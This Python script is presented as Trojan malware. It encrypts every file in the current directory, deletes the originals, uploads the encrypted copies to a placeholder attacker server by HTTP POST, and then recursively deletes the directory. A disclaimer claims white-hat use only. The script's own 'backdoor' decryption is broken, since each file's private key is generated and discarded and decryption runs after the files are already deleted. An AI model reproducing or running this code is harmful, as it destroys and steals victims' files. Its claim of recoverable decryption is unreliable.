#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 7th 2024
# Important Note:
#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
# these scripts. They are malicious and should only be used in professionally approved White Hat 
# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
# and if that repository is public, all the extracted data will be available for the whole world to see.
# Description of Script
# The provided code is a Python script designed to automate the encryption, transmission to a remote server
# , and decryption of files. Upon execution, the script encrypts all files within the current directory 
# using AES encryption with a randomly generated session key and then encrypts this session key with RSA.
# The encrypted files are then sent to a specified server URL using HTTP POST requests. After successful 
# transmission, the script instructs the user on how to access the files from the server, emphasizing 
# the importance of keeping this information secure. Additionally, the script includes functionality 
# to decrypt files using a backdoor private key. To use the script, simply run it on the target system.
# Ensure that the appropriate libraries (Cryptodome and requests) are installed and configured correctly,
# and modify the SERVER_URL variable to match the URL of your server. Optionally, provide the path to 
# the backdoor private key (backdoor_private_key.pem) for decryption purposes.
#################################################################################################
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
import base64
import zlib
import os
import shutil
import requests

# Server URL to send encrypted files
SERVER_URL = "http://your-server.com/upload"

# Generate new RSA key pair
def generate_rsa_keys():
    new_key = RSA.generate(4096)  # Generate a new RSA key pair with a size of 4096 bits
    private_key = new_key.export_key()  # Export the private key to bytes
    public_key = new_key.public_key().export_key()  # Export the public key to bytes
    return public_key, private_key  # Return the public and private keys

# Encrypt a file
def encrypt_file(file_path):
    public_key, _ = generate_rsa_keys()  # Generate new keys for each encryption
    with open(file_path, 'rb') as f:  # Open the file to encrypt in binary mode
        plaintext = f.read()  # Read the plaintext bytes from the file

    compressed_text = zlib.compress(plaintext)  # Compress the plaintext using zlib

    session_key = get_random_bytes(16)  # Generate a random session key of 16 bytes
    cipher_aes = AES.new(session_key, AES.MODE_EAX)  # Create an AES cipher object with the session key
    ciphertext, tag = cipher_aes.encrypt_and_digest(compressed_text)  # Encrypt the compressed text

    cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))  # Get the RSA cipher object for encryption
    encrypted_session_key = cipher_rsa.encrypt(session_key)  # Encrypt the session key with RSA

    encrypted_data = encrypted_session_key + cipher_aes.nonce + tag + ciphertext  # Combine encrypted data

    with open(f'{file_path}.enc', 'wb') as f:  # Open a file to write the encrypted data
        f.write(base64.b64encode(encrypted_data))  # Encode and write the encrypted data to the file

    # Delete the original file after encryption
    os.remove(file_path)

# Encrypt all files in a directory
def encrypt_directory(directory_path):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path)

# Send encrypted files to the server
def send_to_server(directory_path):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                files = {'file': f}
                response = requests.post(SERVER_URL, files=files)
                if response.status_code == 200:
                    print(f"{file_path} sent to server successfully.")
                    print("To access and steal the files, go to:")
                    print(SERVER_URL)
                    print("Make sure to keep this information secure.")
                else:
                    print(f"Failed to send {file_path} to server.")

# Decrypt a file
def decrypt_file(file_path, private_key_path):
    with open(file_path, 'rb') as f:  # Open the encrypted file in binary mode
        encrypted_data = base64.b64decode(f.read())  # Read and decode the base64-encoded data

    encrypted_bytes = bytearray(encrypted_data)
    private_key = RSA.import_key(open(private_key_path).read())  # Import the private key from file
    encrypted_session_key = encrypted_bytes[:private_key.size_in_bytes()]  # Extract encrypted session key
    nonce = encrypted_bytes[private_key.size_in_bytes():private_key.size_in_bytes()+16]  # Extract nonce
    tag = encrypted_bytes[private_key.size_in_bytes()+16:private_key.size_in_bytes()+32]  # Extract tag
    ciphertext = encrypted_bytes[private_key.size_in_bytes()+32:]  # Extract ciphertext

    session_key = private_key.decrypt(encrypted_session_key)  # Decrypt the session key with RSA
    cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)  # Create AES cipher object with session key and nonce
    decrypted = cipher_aes.decrypt_and_verify(ciphertext, tag)  # Decrypt and verify the ciphertext

    plaintext = zlib.decompress(decrypted)  # Decompress the decrypted text

    with open(file_path[:-4], 'wb') as f:  # Open a file to write the decrypted plaintext
        f.write(plaintext)  # Write the plaintext to the file

if __name__ == '__main__':
    # Encrypt all files in the current directory
    encrypt_directory(os.getcwd())
    
    # Send encrypted files to the server
    send_to_server(os.getcwd())
    
    # Delete the current directory after sending files
    shutil.rmtree(os.getcwd())

    # Decrypt files using a backdoor key
    private_key_path = "backdoor_private_key.pem"  # Path to the backdoor private key
    for root, _, files in os.walk("."):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(".enc"):
                decrypt_file(file_path, private_key_path)
